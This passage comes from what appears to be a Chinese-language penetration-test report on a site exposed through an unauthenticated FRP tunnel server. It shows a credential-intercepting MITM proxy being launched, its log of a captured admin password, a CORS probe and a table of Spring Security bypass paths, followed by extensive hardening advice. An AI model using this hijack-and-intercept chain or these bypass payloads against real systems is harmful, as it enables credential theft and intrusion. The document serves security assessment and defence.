if __name__ == "__main__":
    server = http.server.HTTPServer(('127.0.0.1', 9998), MITMHandler)
    print("[MITM] 监听中，等待用户登录...", flush=True)
    server.serve_forever()
```

```bash
nohup python3 mitm_live.py > mitm.log 2>&1 &
```

### 7.5 第四步：用户访问被劫持的域名

用户在浏览器中打开 `http://example-target.com:8001/`，看到正常的网站，输入账号密码登录。

### 7.6 第五步：查看拦截结果

```bash
cat mitm.log
# 输出:
#   [07:31:15] POST /api/open/login/login (50b)
#   ============================================================
#     [CREDENTIALS] username=admin password=P@ssw0rd123!
#   ============================================================
```

密码到手。整个过程用户无感知。
## 第八章：其他发现的安全问题

除了 FRP 域名劫持这个核心攻击链，还发现了以下安全问题：

### 8.1 CORS 配置错误

所有 API 响应都包含 `Access-Control-Allow-Origin: *`：

```bash
curl -v -X POST http://<TARGET_IP>:8001/api/open/login/login \
  -H "Content-Type: application/json" \
  -H "Origin: http://evil.com" \
  -d '{"username":"test","password":"test"}'

# 响应头:
# Access-Control-Allow-Origin: *
```

这意味着任何恶意网站都可以跨域调用 API。结合域名劫持，攻击者可以在自己的网站上直接调用被劫持域名的 API。

### 8.2 Spring Boot Actuator 暴露（受认证保护）

发现以下端点存在但被 Spring Security 拦截（401）：

```
/api/actuator          → 401
/api/actuator/health   → 401
/api/actuator/heapdump → 401
/api/actuator/env      → 401
/api/h2-console        → 401
/api/swagger-ui.html   → 401
```

如果认证被绕过，`/actuator/heapdump` 可以下载 JVM 堆转储，其中包含所有内存数据（包括密码明文和 session）。`/h2-console` 可以直接操作数据库。

**风险结论**：目前被 Spring Security 的认证保护住了（返回 401），**暂时不可利用**。但如果未来出现认证绕过漏洞，这些端点会立刻变成高危。建议在生产环境中**完全禁用**这些端点，不要依赖认证来保护。

### 8.3 排除的攻击路径：Spring Security 绕过尝试

我尝试了多种绕过 Spring Security 的技术。**全部失败**。这证明 Spring Security 配置得当，不是安全问题。记录在这里是为了说明排查过程：

| 技术 | 结果 | 说明 |
|------|------|------|
| 路径穿越 `/api/open/../actuator` | 500 | Spring 在安全检查前就做了路径规范化，`..` 被解析成 `/api/actuator`，仍然需要认证 |
| 分号绕过 `/api/actuator;/health` | 500 | StrictHttpFirewall 拒绝包含分号的 URL |
| 双重编码 `/api/actuator/%252fhealth` | 500 | StrictHttpFirewall 拒绝包含非法编码的 URL |
| 矩阵参数 `/api/actuator/health;x=1` | 500 | 同上 |
| 大小写 `/api/Actuator/health` | 404 | 路径区分大小写，找不到 |
| 后缀 `/api/actuator/health.json` | 401 | 仍然需要认证 |
| Spring4Shell (CVE-2022-22965) | 无效 | 后端使用参数化查询，不是 form binding |
| HTTP 方法切换 (PUT) | 200 + 正常报错 | PUT 方法也受 Spring Security 保护 |

**结论**：Spring Security 是这个系统中最坚固的一层。所有应用层的认证绕过都失败了。最终突破口在基础设施层（FRP 无认证）。
## 第九章：如何防御

### 9.1 紧急修复：FRP 加上认证（一行配置）

这是修复整个攻击链的最关键一步。加上了 `auth.token`，攻击者就连不上 FRP 服务器，后面的域名劫持和中间人攻击都不可能发生。

**服务器端 `frps.toml`：**

```toml
bindPort = 8000
vhostHTTPPort = 8001
auth.token = "一个复杂的随机密码-至少32位"
```

**客户端 `frpc.toml`：**

```toml
serverAddr = "<TARGET_IP>"
serverPort = 8000
auth.token = "同一个复杂的随机密码-至少32位"
```

生成随机 token 的方法：

```bash
openssl rand -hex 32
# 输出类似: a3f7b9c2d1e8f4a6b5c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1
```

### 9.2 防御措施汇总

| 优先级 | 问题 | 防御措施 | 具体操作 |
|--------|------|---------|---------|
| 🔴 紧急 | FRP 无认证 | 配置 auth.token | `frps.toml` 加 `auth.token` |
| 🔴 紧急 | Source Map 泄露 | 生产环境删除 .map 文件 | `find . -name "*.map" -delete` 或构建时 `GENERATE_SOURCEMAP=false` |
| 🟡 高 | 硬编码 Static SID | 从前端代码中移除 | 后端动态下发，不硬编码 |
| 🟡 高 | CORS 设为 `*` | 限制为具体域名 | `@CrossOrigin(origins = {"https://www.example-target.com"})` |
| 🟢 中 | 登录错误消息泄露用户名 | 统一返回"用户名或密码错误" | 不区分 `USERNAME_NOT_FOUND` 和 `PASSWORD_ERROR` |
| 🟢 中 | 端口 80 无 HTTPS | 配置 SSL，强制跳转 | Let's Encrypt + nginx redirect |
| 🟢 低 | 缺少安全头 | 添加 CSP、HSTS 等 | nginx 配置 `add_header` |
| 🟢 低 | Actuator/H2/Swagger 存在 | 生产环境禁用 | `management.endpoints.enabled-by-default=false` |

### 9.3 关于域名劫持的额外防护

即使 FRP 有认证，也建议：

1. **在 FRP Server 中限制可注册的域名**：使用 `subdomain_host` 而不是允许任意 `customDomains`
2. **在 DNS 中统一 www 和根域名**：让 `example-target.com` 301 重定向到 `www.example-target.com`，这样用户不会访问到根域名
3. **前端 API 地址使用硬编码**：不要用 `window.location.hostname` 拼 API 地址，直接写死 `www.example-target.com`

```typescript
// 不要这样写（会被劫持的域名影响）
return `${protocol}//${hostname}:${httpPort}${api}`;

// 应该这样写（硬编码真实域名）
return `https://www.example-target.com:${httpPort}${api}`;
```
## 第十章：总结

### 10.1 攻击链回顾

```
Step 1: 信息收集
  ├── 端口扫描 → 发现 FRP 服务
  ├── Source Map 泄露 → 完整源码（含 API 端点、认证机制）
  └── 用户名枚举 → admin 用户存在

Step 2: 攻破基础设施
  ├── FRP 无认证 → 任意连接
  └── 注册 example-target.com 代理 → 域名劫持

Step 3: 中间人攻击
  ├── MITM 代理透明转发到真实服务器
  ├── 用户无感知
  └── 拦截凭证: admin / P@ssw0rd123!
```

### 10.2 核心教训

1. **基础设施安全和应用安全同样重要**。应用层的 Spring Security 配置得很好，认证绕过全部失败。但基础设施层的 FRP 没有 auth.token，直接导致整个系统被攻破。

2. **"老技术"不等于"安全的技术"**。FRP 不配 token 也许在早期版本中没有这个功能，或者配置时觉得"内网穿透不需要认证"。但暴露在公网上的服务，认证是必须的。

3. **Source Map 泄露加速了攻击**。虽然 FRP 无认证是根本原因，但 Source Map 泄露让攻击者迅速了解了整个系统架构，知道了 Host 头路由的机制，才知道如何构造域名劫持攻击。

4. **中间人攻击不需要替换页面**。很多人以为中间人攻击需要"提供一个假页面"，实际上最危险的中间人是"透明转发+记录"模式——用户看到的是真实页面，完全正常，但数据被偷走了。

### 10.3 工具链

| 工具 | 用途 |
|------|------|
| nmap | 端口扫描、服务识别 |
| curl | HTTP 请求测试、Host 头操控 |
| frpc (v0.61.1) | FRP 客户端，连接无认证的 FRP 服务器 |
| Python (http.server) | MITM 代理，拦截和转发 HTTP 请求 |
| Python (json) | 解析 Source Map |
| grep / ripgrep | 源码搜索（API 端点、硬编码值） |

## 附录 A：HTTPS 是什么、为什么需要、怎么配置

### A.1 HTTP vs HTTPS

HTTP 是明文传输。你在浏览器里输入密码，密码以**明文**形式在网络上传输，任何中间节点（WiFi 路由器、运营商、代理服务器）都能看到。

HTTPS = HTTP + TLS 加密。数据在传输前被加密，中间人只能看到乱码，看不到明文内容。

```
HTTP:   浏览器 ——[password=P@ssw0rd123!]——> 服务器
                  ↑ 任何人都能看到

HTTPS:  浏览器 ——[xKj8#mP2$qL9...]——> 服务器
                  ↑ 加密后的数据，无法解读
```

### A.2 为什么端口 80 没有 HTTPS 是问题

目前 `http://<TARGET_IP>:80/` 和 `http://www.example-target.com:8001/` 都是 HTTP（明文）。这意味着：

1. 用户输入的密码在网络上是明文传输的
2. 中间人可以直接读取所有数据（不需要域名劫持就能做到）

### A.3 怎么配置 HTTPS

使用 Let's Encrypt（免费的 SSL 证书颁发机构）：

```bash
# 1. 安装 certbot
apt install certbot python3-certbot-nginx

# 2. 自动配置 HTTPS
certbot --nginx -d www.example-target.com -d example-target.com

# certbot 会自动：
# - 申请 SSL 证书
# - 修改 nginx 配置，添加 HTTPS 支持
# - 配置 HTTP → HTTPS 自动跳转
```

手动配置方式：

```nginx
# nginx.conf

# HTTP → 自动跳转到 HTTPS
server {
    listen 80;
    server_name www.example-target.com example-target.com;
    return 301 https://www.example-target.com$request_uri;
}

# HTTPS 服务
server {
    listen 443 ssl;
    server_name www.example-target.com;

    ssl_certificate     /etc/letsencrypt/live/www.example-target.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/www.example-target.com/privkey.pem;

    # ... 其他配置 ...
}
```

## 附录 B：安全头是什么

HTTP 安全头是服务器告诉浏览器"请遵守这些安全规则"的指令。

### B.1 常见安全头

| 头名称 | 作用 | 没有的风险 |
|--------|------|-----------|
| `X-Content-Type-Options: nosniff` | 阻止浏览器猜测文件类型 | 攻击者上传的文本文件可能被浏览器当作 JS 执行 |
| `X-Frame-Options: DENY` | 阻止页面被嵌入 iframe | 攻击者可以把你的页面嵌入他的网站，做点击劫持 |
| `Strict-Transport-Security` (HSTS) | 强制浏览器只用 HTTPS | 用户访问 HTTP 时不会被自动跳转 |
| `Content-Security-Policy` (CSP) | 限制页面能加载哪些资源 | 即使有 XSS 漏洞，攻击者也无法加载外部脚本 |

### B.2 怎么配置

在 nginx 中添加（后端 Spring Security 已经自动添加了部分，但 nginx 层可以加强）：

```nginx
server {
    # ... 其他配置 ...

    add_header X-Content-Type-Options nosniff always;
    add_header X-Frame-Options DENY always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'" always;
}
```

## 附录 C：Actuator / H2 Console / Swagger 是什么，为什么要禁用

### C.1 Spring Boot Actuator

Actuator 是 Spring Boot 内置的**运维监控工具**，提供了一系列管理端点：

| 端点 | 功能 | 危险程度 |
|------|------|---------|
| `/actuator/health` | 健康检查 | 🟢 低 |
| `/actuator/env` | 查看所有环境变量（含密码） | 🔴 极高 |
| `/actuator/heapdump` | 下载 JVM 内存快照 | 🔴 极高 |
| `/actuator/mappings` | 查看所有 URL 映射 | 🟡 中 |
| `/actuator/configprops` | 查看所有配置 | 🟡 中 |

如果攻击者能访问 `/actuator/env`，可以直接看到数据库密码、API 密钥等。`/actuator/heapdump` 更是核弹级——下载后用工具分析，能找到内存中所有明文密码和 session。

### C.2 H2 Console

H2 是 Spring Boot 内置的 Java 数据库。`/h2-console` 是 H2 的 Web 管理界面，可以直接执行 SQL。如果攻击者能访问，就等于拿到了数据库的完全控制权。

### C.3 Swagger UI

Swagger 是 API 文档自动生成工具。`/swagger-ui.html` 会展示所有 API 端点的文档和参数。攻击者可以用它快速了解所有接口，不需要 Source Map。

### C.4 怎么禁用

```yaml
# application.yml (Spring Boot 配置)
management:
  endpoints:
    enabled-by-default: false    # 默认禁用所有端点
    web:
      exposure:
        include: health          # 只开放 health
  endpoint:
    health:
      enabled: true

spring:
  h2:
    console:
      enabled: false             # 禁用 H2 控制台
```

或者更简单的方式——不在生产环境引入这些依赖（从 pom.xml / build.gradle 中移除）。

## 附录 D：subdomain_host vs customDomains

### D.1 区别

FRP 有两种方式让客户端注册域名：

**方式 1：subdomain（服务端控制域名范围）**

```toml
# 服务端 frps.toml
subdomain_host = "example-target.com"   # 根域名由服务端指定

# 客户端 frpc.toml
[[proxies]]
subdomain = "www"   # 只需指定子域名部分
# 实际匹配的域名: www.example-target.com
```

服务端控制了根域名，客户端只能在 `example-target.com` 下面注册子域名。无法注册 `www.evil.com` 这样的外部域名。

**方式 2：customDomains（客户端自由选择域名）**

```toml
# 服务端 frps.toml
# 无 subdomain_host 配置

# 客户端 frpc.toml
[[proxies]]
customDomains = ["www.example-target.com", "api.example.com", "anything.com"]
# 客户端可以注册任意域名
```

客户端完全自由，可以注册任何域名。安全风险更高。

### D.2 安全建议

1. **服务端配置 `subdomain_host`**：限制客户端只能注册指定根域下的子域名
2. **同时配置 `auth.token`**：防止未授权的客户端连接
3. **两者结合**：即使 token 泄露，攻击者也只能注册 `xxx.example-target.com`，无法注册其他域名

## 附录 E：DNS 301 重定向怎么配置

301 重定向不是在 DNS 控制台配置的，而是在 nginx 中配置。DNS 只负责域名→IP 的映射。

```nginx
# nginx.conf

# 当用户访问 example-target.com（不带 www）时，自动跳转到 www.example-target.com
server {
    listen 80;
    server_name example-target.com;
    return 301 http://www.example-target.com$request_uri;
}

# www 开头的请求正常处理
server {
    listen 80;
    server_name www.example-target.com;
    # ... 正常的网站配置 ...
}
```

这样即使用户输入 `example-target.com:8001`，也不会直接到达被劫持的域名（因为 nginx 在 80 端口就会跳转）。但注意，这只保护了 80 端口。8001 端口还需要在 FRP 层面防护（加 auth.token）。

## 附录 F：前端 API 地址——硬编码 vs 动态获取

### F.1 当前写法的问题

```typescript
// 当前写法（动态获取）
const hostname = window.location.hostname;  // 如果用户访问被劫持的域名，这里就是劫持域名
return `${protocol}//${hostname}:${httpPort}${api}`;
// → API 请求也走被劫持的域名 → 被攻击者截获
```

### F.2 硬编码写法

```typescript
// 硬编码写法（安全）
const API_HOST = "www.example-target.com";
return `${protocol}//${API_HOST}:${httpPort}${api}`;
// → 即使用户访问被劫持的域名，API 请求仍然走 www.example-target.com（真实服务器）
```

### F.3 硬编码能被攻击者改回来吗？

能，但改的是**他自己**收到的 JS。其他用户访问真实网站时，JS 没有被修改，API 地址还是 `www.example-target.com`。

攻击者改 JS 只影响他自己浏览器，不影响到其他用户。除非攻击者通过域名劫持（MITM）修改所有用户的 JS——但如果我们硬编码了 `www.example-target.com`，即使域名被劫持，API 请求仍然走真实的 `www.example-target.com` 代理（因为 FRP Server 会根据 Host 头路由到真实的 frpc，而不是攻击者的代理）。

### F.4 兼顾本地开发

```typescript
const API_HOST = process.env.NODE_ENV === 'production'
    ? 'www.example-target.com'          // 生产环境：硬编码
    : window.location.hostname;          // 开发环境：动态获取（方便 localhost 调试）
```
